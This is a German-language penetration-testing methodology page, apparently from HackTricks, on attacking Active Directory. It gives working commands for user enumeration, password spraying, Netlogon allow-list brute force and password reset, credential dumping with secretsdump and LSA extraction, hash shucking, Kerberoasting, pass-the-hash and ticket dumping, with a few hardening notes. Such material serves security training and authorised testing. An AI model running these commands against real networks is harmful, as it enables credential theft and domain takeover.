# Active Directory Methodik

{{#include ../../banners/hacktricks-training.md}}

## Grundlegender Überblick

**Active Directory** dient als grundlegende Technologie und ermöglicht es **Netzwerkadministratoren**, **Domänen**, **Benutzer** und **Objekte** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Es ist auf Skalierbarkeit ausgelegt und erleichtert die Organisation einer großen Anzahl von Benutzern in verwaltbare **Gruppen** und **Untergruppen**, während **Zugriffsrechte** auf verschiedenen Ebenen kontrolliert werden.

Die Struktur von **Active Directory** besteht aus drei primären Ebenen: **Domänen**, **Bäumen** und **Gesamtstrukturen**. Eine **Domäne** umfasst eine Sammlung von Objekten, wie **Benutzer** oder **Geräte**, die eine gemeinsame Datenbank verwenden. **Bäume** sind Gruppen dieser Domänen, die durch eine gemeinsame Struktur verbunden sind, und eine **Gesamtstruktur** stellt die Sammlung mehrerer Bäume dar, die durch **Vertrauensbeziehungen** miteinander verbunden sind und die oberste Ebene der Organisationsstruktur bilden. Auf jeder dieser Ebenen können bestimmte **Zugriffs**- und **Kommunikationsrechte** festgelegt werden.

Zu den wichtigsten Konzepten innerhalb von **Active Directory** gehören:

1. **Verzeichnis** – Enthält alle Informationen zu Active-Directory-Objekten.
2. **Objekt** – Bezeichnet Entitäten innerhalb des Verzeichnisses, einschließlich **Benutzern**, **Gruppen** oder **freigegebenen Ordnern**.
3. **Domäne** – Dient als Container für Verzeichnisobjekte. Mehrere Domänen können innerhalb einer **Gesamtstruktur** koexistieren, wobei jede ihre eigene Objektsammlung verwaltet.
4. **Baum** – Eine Gruppierung von Domänen, die eine gemeinsame Stammdomäne verwenden.
5. **Gesamtstruktur** – Die höchste Ebene der Organisationsstruktur in Active Directory, bestehend aus mehreren Bäumen mit **Vertrauensbeziehungen** untereinander.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks entscheidend sind. Zu diesen Diensten gehören:

1. **Domänendienste** – Zentralisieren die Datenspeicherung und verwalten Interaktionen zwischen **Benutzern** und **Domänen**, einschließlich Funktionen zur **Authentifizierung** und **Suche**.
2. **Zertifikatdienste** – Überwachen die Erstellung, Verteilung und Verwaltung sicherer **digitaler Zertifikate**.
3. **Verzeichnisdienste mit geringem Verwaltungsaufwand** – Unterstützen verzeichnisfähige Anwendungen über das **LDAP-Protokoll**.
4. **Verzeichnisverbunddienste** – Bieten **Single-Sign-on**-Funktionen zur Authentifizierung von Benutzern über mehrere Webanwendungen innerhalb einer einzigen Sitzung.
5. **Rechteverwaltung** – Unterstützt den Schutz urheberrechtlich geschützten Materials, indem die unbefugte Verteilung und Nutzung reguliert wird.
6. **DNS-Dienst** – Ist entscheidend für die Auflösung von **Domänennamen**.

Eine ausführlichere Erklärung findest du unter: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos-Authentifizierung**

Um zu lernen, wie man ein **AD angreift**, musst du den **Kerberos-Authentifizierungsprozess** wirklich gut **verstehen**.\
[**Lies diese Seite, wenn du noch nicht weißt, wie er funktioniert.**](kerberos-authentication.md)

## Cheat Sheet

Unter [https://wadcoms.github.io/](https://wadcoms.github.io) findest du eine Übersicht der Befehle, die du zur Enumeration/zum Exploit eines AD ausführen kannst.

> [!WARNING]
> Die Kerberos-Kommunikation **erfordert normalerweise einen vollständig qualifizierten Domänennamen (FQDN)**, damit der Client ein Ticket für den korrekten SPN erhalten kann. Beim Zugriff auf einen Computer über seine IP-Adresse wird häufig auf NTLM anstelle von Kerberos zurückgegriffen.

## Active Directory Recon (Keine creds/Sitzungen)

Wenn du lediglich Zugriff auf eine AD-Umgebung hast, aber keine Credentials/Sitzungen besitzt, könntest du:

- **Das Netzwerk pentesten:**
- Das Netzwerk scannen, Computer und offene Ports finden und versuchen, **Schwachstellen auszunutzen** oder **Credentials zu extrahieren** (beispielsweise können [Drucker sehr interessante Ziele sein](ad-information-in-printers.md)).
- Eine DNS-Enumeration könnte Informationen über wichtige Server in der Domäne liefern, etwa Webserver, Drucker, Shares, VPN, Medien usw.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Wirf einen Blick auf die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), um weitere Informationen darüber zu erhalten.
- **Auf anonymen und Guest-Zugriff auf SMB-Dienste prüfen** (dies funktioniert nicht bei modernen Windows-Versionen):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Eine ausführlichere Anleitung zur Enumeration eines SMB-Servers findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP enumerieren**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Eine ausführlichere Anleitung zur Enumeration von LDAP findest du hier (achte **besonders auf den anonymen Zugriff**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Das Netzwerk vergiften**
- Credentials durch [**das Imitieren von Diensten mit Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) sammeln
- Über [**das Ausnutzen des Relay-Angriffs**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) auf den Host zugreifen
- Credentials durch das **Offenlegen** [**gefälschter UPnP-Dienste mit evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) sammeln
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Benutzernamen/Namen aus internen Dokumenten, sozialen Medien und Diensten (hauptsächlich aus dem Web) innerhalb der Domänenumgebungen sowie aus öffentlich verfügbaren Quellen extrahieren.
- Wenn du die vollständigen Namen von Mitarbeitern eines Unternehmens findest, könntest du verschiedene AD-**Benutzernamekonventionen (**[**lies dies**](https://activedirectorypro.com/active-directory-user-naming-convention/)) ausprobieren. Die häufigsten Konventionen sind: _NameNachname_, _Name.Nachname_, _NamSur_ (jeweils 3 Buchstaben), _Nam.Sur_, _NNachname_, _N.Nachname_, _NachnameName_, _Nachname.Name_, _NachnameN_, _Nachname.N_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Benutzer-Enumeration

- **Anonyme SMB/LDAP-Enumeration:** Siehe die Seiten zu [**Pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**Pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute-Enumeration**: Wenn ein **ungültiger Benutzername angefordert wird**, antwortet der Server mit dem **Kerberos-Fehlercode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_. Dadurch können wir feststellen, dass der Benutzername ungültig war. **Gültige Benutzernamen** führen entweder zu einer **TGT**-Antwort in einem **AS-REP** oder zum Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_, der angibt, dass der Benutzer eine Pre-Authentication durchführen muss.
- **Keine Authentifizierung gegenüber MS-NRPC**: Verwendung von auth-level = 1 (keine Authentifizierung) gegenüber der MS-NRPC-(Netlogon-)Schnittstelle auf Domain Controllern. Die Methode ruft nach dem Binden an die MS-NRPC-Schnittstelle die Funktion `DsrGetDcNameEx2` auf, um ohne Credentials zu prüfen, ob der Benutzer oder Computer existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Recherche ist [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> zu finden.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn du einen dieser Server im Netzwerk gefunden hast, kannst du auch **User Enumeration gegen ihn** durchführen. Zum Beispiel könntest du das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Listen von Benutzernamen findest du in [**diesem github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  und in diesem ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Allerdings solltest du aus dem Recon-Schritt, den du vor diesem durchgeführt haben solltest, die **Namen der Personen kennen, die im Unternehmen arbeiten**. Mit Vor- und Nachnamen könntest du das Script [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um potenziell gültige Benutzernamen zu generieren.

### Missbrauch der Allow-List für den verwundbaren Netlogon-Kanal (Onelogon)

Auch nachdem **Zerologon** auf dem DC gepatcht wurde, können explizit Allow-gelistete Konten weiterhin durch **legacy/vulnerable Netlogon secure-channel behavior** exponiert sein. Die riskante Konfiguration ist die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** oder der entsprechende Registry-Wert **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Bei diesem Wert handelt es sich um einen **SDDL security descriptor** (siehe [Sicherheitsdeskriptoren](security-descriptors.md)). Jedes Konto oder jede Gruppe, dem bzw. der der relevante ACE in der DACL gewährt wurde, kann als Ziel verwendet werden. Beispielsweise lässt `O:BAG:BAD:(A;;RC;;;WD)` effektiv **Everyone** zu.

Praktischer Operator-Workflow:

1. **Identifiziere Allow-gelistete Principals**, indem du sowohl **SYSVOL/GPO** als auch die **live DC registry** überprüfst.
2. **Löse die in der SDDL gefundenen SIDs auf**, um die zugehörigen AD-Benutzer und -Computer zu bestimmen, und priorisiere **DC machine accounts**, **trust accounts** und andere privilegierte Maschinen.
3. Versuche wiederholt eine **MS-NRPC / Netlogon authentication** als das Allow-gelistete Konto.
4. Nach einem erfolgreichen Guess missbrauche **Netlogon password-setting**, um das Passwort des Zielkontos zurückzusetzen (der öffentliche PoC setzt es auf einen leeren String).<sup>[[9]](#references)[[10]](#references)</sup>

Kurze Triage- / Lab-Beispiele aus dem öffentlichen Artefakt:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Hinweise:

- Der **Scanner** ist nützlich, da die effektive Allow-Liste in **SYSVOL**, in der **Registry** oder in beiden vorhanden sein kann.
- Der Exploit-Pfad selbst ist wichtig, da er **keine Domain-Admin-Berechtigungen erfordert**, sobald ein verwundbares Konto identifiziert wurde.
- Die Kompromittierung eines **Domain-Controller-Computerkontos** wie `DC$` ist besonders gefährlich, da das Zurücksetzen dieses Passworts direkt weiterführende **AD-Takeover**-Pfade ermöglichen kann.
- Die **Brute-Force-Durchführbarkeit** hängt vom Modus ab: Das öffentliche Artefakt beschreibt einen Meet-in-the-Middle-Ansatz, eine **24-Bit**-Brute-Force, wenn ein weiteres Computerkonto verfügbar ist, sowie langsamere **32-Bit**-Varianten.

Hinweise zur Erkennung und Härtung:

- Überprüfe die Allow-List-Richtlinie und entferne alles außer temporären, ausdrücklich erforderlichen Kompatibilitätsausnahmen.
- Überwache DC-**System**-Events **5827/5828/5829/5830/5831**, um abgelehnte, entdeckte oder durch Richtlinien ausdrücklich erlaubte verwundbare Netlogon-Verbindungen zu erkennen.
- Behandle Konten in `VulnerableChannelAllowList` als **hohes Risiko**, bis die Legacy-Abhängigkeit entfernt wurde.

### Einen oder mehrere Benutzernamen kennen

Angenommen, du weißt bereits, dass du einen gültigen Benutzernamen hast, aber keine Passwörter ... Dann versuche Folgendes:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer das Attribut _DONT_REQ_PREAUTH_ **nicht besitzt**, kannst du eine **AS_REP-Nachricht** für diesen Benutzer **anfordern**, die einige Daten enthält, die durch eine Ableitung des Passworts des Benutzers verschlüsselt wurden.
- [**Password Spraying**](password-spraying.md): Versuche die **häufigsten Passwörter** mit jedem der entdeckten Benutzer. Vielleicht verwendet ein Benutzer ein schlechtes Passwort (beachte die Passwortrichtlinie!).
- Beachte, dass du auch **OWA-Server sprayen** kannst, um Zugriff auf die Mailserver der Benutzer zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Du kannst möglicherweise einige Challenge-**Hashes** **erlangen**, indem du **Poisoning** gegen bestimmte Protokolle des **Netzwerks** durchführst:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Die Enumeration von Active Directory liefert Benutzernamen, E-Mail-Kennungen und Benennungsmuster, potenzielle Hosts sowie Services, die möglicherweise dazu gezwungen werden können, sich zu authentifizieren. Nutze diesen Kontext, um geeignete NTLM-[**Relay-Angriffe**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) und potenzielle Pfade in die AD-Umgebung zu identifizieren.

### Von NetExec-Workspaces gesteuerte Reconnaissance- und Relay-Posture-Prüfungen

- Verwende **`nxcdb`-Workspaces**, um den Status der AD-Reconnaissance pro Engagement zu speichern: `workspace create <name>` erstellt protokollspezifische SQLite-Datenbanken unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/usw.). Wechsle die Ansichten mit `proto smb|mssql|winrm` und liste gesammelte Secrets mit `creds` auf. Lösche sensible Daten anschließend manuell: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Eine schnelle Subnetzerkennung mit **`netexec smb <cidr>`** zeigt **Domain**, **OS-Build**, **SMB-Signaturanforderungen** und **Null Auth** an. Mitglieder mit `(signing:False)` sind **Relay-anfällig**, während DCs häufig eine Signatur voraussetzen.
- Erzeuge **Hostnamen in /etc/hosts** direkt aus der NetExec-Ausgabe, um das Targeting zu erleichtern:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wenn **SMB relay to the DC is blocked** durch signing, sollte weiterhin die **LDAP**-Sicherheitslage geprüft werden: `netexec ldap <dc>` hebt `(signing:None)` / weak channel binding hervor. Ein DC mit erzwungenem SMB signing, aber deaktiviertem LDAP signing, bleibt ein geeignetes **relay-to-LDAP**-Ziel für Angriffe wie **SPN-less RBCD**.

### Client-seitige Drucker-Credential-Leaks → umfassende Validierung von Domain-Credentials

- Drucker-/Web-UIs enthalten manchmal **maskierte Admin-Passwörter im HTML**. Das Anzeigen des Quelltexts bzw. die Verwendung der Devtools kann Klartext offenlegen (z. B. `<input value="<password>">`) und so Basic-auth-Zugriff auf Scan-/Druck-Repositories ermöglichen.
- Abgerufene Druckaufträge können **Onboarding-Dokumente im Klartext** mit benutzerspezifischen Passwörtern enthalten. Beim Testen sollten die Zuordnungen beibehalten werden:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM-Creds stehlen

Wenn du mit dem **null- oder guest-User auf andere PCs oder Shares zugreifen** kannst, könntest du **Dateien platzieren** (z. B. eine SCF-Datei), die bei einem Zugriff irgendwie eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge stehlen** und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandelt jeden NT-Hash, den du bereits besitzt, als Kandidatenpasswort für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos-RC4-Tickets, NetNTLM-Challenges oder gecachten Credentials per Brute-Force zu testen, übergibst du die NT-Hashes an die NT-candidate-Modi von Hashcat und lässt die Wiederverwendung von Passwörtern validieren, ohne jemals den Klartext zu erfahren. Dies ist besonders effektiv nach einem Domain Compromise, wenn du Tausende aktuelle und frühere NT-Hashes sammeln kannst.<sup>[[5]](#references)</sup>

Verwende shucking, wenn:

- Du über ein NT-Corpus aus DCSync-, SAM/SECURITY-Dumps oder Credential Vaults verfügst und die Wiederverwendung in anderen Domains/Forests testen musst.
- Du RC4-basiertes Kerberos-Material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-Antworten oder DCC/DCC2-Blobs erfasst.
- Du die Wiederverwendung langer, nicht crackbarer Passphrasen schnell nachweisen und unmittelbar per Pass-the-Hash pivotieren möchtest.

Die Technik **funktioniert nicht** gegen Verschlüsselungstypen, deren Schlüssel nicht der NT-Hash ist (z. B. Kerberos etype 17/18 AES). Wenn eine Domain ausschließlich AES erzwingt, musst du auf die regulären Passwortmodi zurückgreifen.

#### Ein NT-Hash-Corpus erstellen

- **DCSync/NTDS** – Verwende `secretsdump.py` mit History, um die größtmögliche Menge an NT-Hashes (einschließlich ihrer früheren Werte) abzurufen:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-Einträge erweitern den Kandidatenpool erheblich, da Microsoft bis zu 24 frühere Hashes pro Account speichern kann. Weitere Möglichkeiten zum Sammeln von NTDS-Secrets findest du unter:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint-Cache-Dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM-/SECURITY-Daten und gecachte Domain-Logons (DCC/DCC2). Entferne Duplikate und füge diese Hashes derselben `nt_candidates.txt`-Liste hinzu.
- **Metadaten erfassen** – Bewahre den Benutzernamen/die Domain auf, aus denen jeder Hash stammt (auch wenn die Wordlist nur Hexadezimalwerte enthält). Übereinstimmende Hashes zeigen dir sofort, welcher Principal ein Passwort wiederverwendet, sobald Hashcat den erfolgreichen Kandidaten ausgibt.
- Bevorzuge Kandidaten aus demselben Forest oder einem vertrauenswürdigen Forest; dadurch maximierst du die Wahrscheinlichkeit einer Überschneidung beim Shucking.

#### Hashcat-NT-Candidate-Modi

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Hinweise:

- NT-candidate-Eingaben **müssen rohe NT-Hashes mit 32 Hexadezimalzeichen bleiben**. Deaktiviere Rule Engines (kein `-r`, keine Hybrid-Modi), da Manipulationen das Kandidatenschlüsselmaterial beschädigen.
- Diese Modi sind nicht grundsätzlich schneller, aber der NTLM-Keyspace (~30.000 MH/s auf einem M3 Max) ist etwa 100-mal schneller als Kerberos RC4 (~300 MH/s). Das Testen einer kuratierten NT-Liste ist deutlich günstiger, als den gesamten Passwortbereich im langsamen Format zu durchsuchen.
- Führe immer den **aktuellsten Hashcat-Build** aus (`git clone https://github.com/hashcat/hashcat && make install`), da die Modi 31500/31600/35300/35400 erst kürzlich hinzugefügt wurden.<sup>[[7]](#references)</sup>
- Derzeit gibt es keinen NT-Modus für AS-REQ Pre-Auth, und AES-Etypes (19600/19700) erfordern das Klartextpasswort, da ihre Schlüssel über PBKDF2 aus UTF-16LE-Passwörtern und nicht aus rohen NT-Hashes abgeleitet werden.

#### Beispiel – Kerberoast RC4 (Modus 35300)

1. Erfasse mit einem Benutzer mit niedrigen Privilegien ein RC4-TGS für einen Ziel-SPN (Details findest du auf der Kerberoast-Seite):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Führe Shucking für das Ticket mit deiner NT-Liste durch:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat leitet aus jedem NT-Kandidaten den RC4-Schlüssel ab und validiert den `$krb5tgs$23$...`-Blob. Eine Übereinstimmung bestätigt, dass der Service-Account einen deiner vorhandenen NT-Hashes verwendet.

3. Pivotiere unmittelbar per PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Optional kannst du den Klartext später mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen, falls erforderlich.

#### Beispiel – Cached Credentials (Modus 31600)

1. Dump die gecachten Logons von einer kompromittierten Workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopiere die DCC2-Zeile des interessanten Domain-Benutzers nach `dcc2_highpriv.txt` und führe Shucking durch:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Eine erfolgreiche Übereinstimmung liefert den NT-Hash, der bereits in deiner Liste bekannt ist, und beweist, dass der gecachte Benutzer ein Passwort wiederverwendet. Verwende ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder führe einen Brute-Force-Angriff im schnellen NTLM-Modus durch, um den String wiederherzustellen.

Derselbe Workflow gilt für NetNTLM-Challenge-Responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald eine Übereinstimmung identifiziert wurde, kannst du Relay, SMB/WMI/WinRM PtH starten oder den NT-Hash offline mit Masks/Rules erneut cracken.



## Active Directory MIT Credentials/Session enumerieren

Für diese Phase musst du die **Credentials oder eine Session eines gültigen Domain-Accounts kompromittiert haben.** Wenn du über gültige Credentials oder eine Shell als Domain-Benutzer verfügst, **solltest du daran denken, dass die zuvor genannten Optionen weiterhin Möglichkeiten zur Kompromittierung anderer Benutzer darstellen**.

Bevor du mit der authentifizierten Enumeration beginnst, solltest du das **Kerberos-Double-Hop-Problem** verstehen.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Die Kompromittierung eines Accounts ist ein **wichtiger Schritt zur Bewertung der Domain**, da sie eine authentifizierte **Active-Directory-Enumeration** ermöglicht:

Im Zusammenhang mit [**ASREPRoast**](asreproast.md) kannst du jetzt jeden potenziell verwundbaren Benutzer finden. Beim [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Benutzernamen** erhalten und das Passwort des kompromittierten Accounts, leere Passwörter sowie neue vielversprechende Passwörter testen.

- Du könntest die [**CMD für eine grundlegende Recon**](../basic-cmd-for-pentesters.md#domain-info) verwenden.
- Du kannst auch [**powershell für Recon**](../basic-powershell-for-pentesters/index.html) verwenden, was unauffälliger wäre.
- Du kannst außerdem [**powerview verwenden**](../basic-powershell-for-pentesters/powerview.md), um detailliertere Informationen zu extrahieren.
- Ein weiteres hervorragendes Tool für Recon in einem Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht besonders unauffällig** (abhängig von den verwendeten Collection-Methoden), aber **wenn dich das nicht stört**, solltest du es unbedingt ausprobieren. Finde heraus, wo Benutzer RDP verwenden können, ermittle Pfade zu anderen Gruppen usw.
- **Weitere automatisierte AD-Enumeration-Tools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS-Records des AD**](ad-dns-records.md), da sie interessante Informationen enthalten können.
- Ein **Tool mit GUI**, das du zur Enumeration des Verzeichnisses verwenden kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst auch die LDAP-Datenbank mit **ldapsearch** durchsuchen, um in den Feldern _userPassword_ und _unixUserPassword_ nach Credentials oder sogar nach _Description_ zu suchen. Siehe [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) für weitere Methoden.
- Wenn du **Linux** verwendest, kannst du die Domain auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du könntest auch automatisierte Tools wie die folgenden ausprobieren:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domain-Benutzer extrahieren**

Es ist sehr einfach, alle Domain-Benutzernamen unter Windows zu erhalten (`net user /domain`, `Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux kannst du Folgendes verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Enumeration-Abschnitt klein aussieht, ist er der wichtigste Teil überhaupt. Öffne die Links (vor allem die zu cmd, powershell, powerview und BloodHound), lerne, wie man eine Domain enumeriert, und übe, bis du dich sicher fühlst. Während eines Assessments ist dies der entscheidende Moment, um deinen Weg zu DA zu finden oder festzustellen, dass nichts getan werden kann.

### Kerberoast

Kerberoasting umfasst das Abrufen von **TGS-Tickets**, die von an Benutzer-Accounts gebundenen Services verwendet werden, und das **Offline-Cracken** ihrer Verschlüsselung, die auf Benutzerpasswörtern basiert.

Mehr dazu:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote-Verbindung (RDP, SSH, FTP, Win-RM usw.)

Sobald du einige Credentials erhalten hast, kannst du prüfen, ob du Zugriff auf eine **Maschine** hast. Dafür kannst du **CrackMapExec** verwenden, um entsprechend deinen Port-Scans mit verschiedenen Protokollen Verbindungen zu mehreren Servern zu versuchen.

### Lokale Privilege Escalation

Wenn du Credentials oder eine Session als regulärer Domain-Benutzer kompromittiert hast und auf **eine beliebige Maschine in der Domain zugreifen** kannst, solltest du nach einem Weg suchen, **lokal Privilege Escalation durchzuführen und Credentials zu sammeln**. Lokale Administratorrechte können dir ermöglichen, **Hashes anderer Benutzer** aus dem Speicher (LSASS) und dem lokalen Speicher (SAM) zu dumpen.

Dieses Buch enthält eine vollständige Seite über [**lokale Privilege Escalation unter Windows**](../windows-local-privilege-escalation/index.html) sowie eine [**Checkliste**](../checklist-windows-privilege-escalation.md). Vergiss außerdem nicht, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Tickets der aktuellen Session

Es ist sehr **unwahrscheinlich**, dass du in der aktuellen Benutzer-**Session Tickets** findest, die dir die **Berechtigung für den Zugriff** auf unerwartete Ressourcen geben. Du könntest jedoch Folgendes prüfen:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Mit Domain-Credentials oder einer Benutzersitzung solltest du NTLM-[**Relay-Angriffe**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erneut untersuchen: Authentifizierte Enumeration- und Coercion-Techniken können Relay-Pfade offenlegen, die während der nicht authentifizierten Reconnaissance nicht verfügbar waren.

### Suche nach Creds in Computerfreigaben | SMB Shares

Da du nun einige grundlegende Credentials hast, solltest du prüfen, ob du **interessante Dateien finden** kannst, die **innerhalb der AD freigegeben** sind. Du könntest das manuell erledigen, aber es ist eine sehr langweilige, repetitive Aufgabe (und noch mehr, wenn du Hunderte Dokumente findest, die du überprüfen musst).

[**Folge diesem Link, um mehr über Tools zu erfahren, die du verwenden könntest.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds stehlen

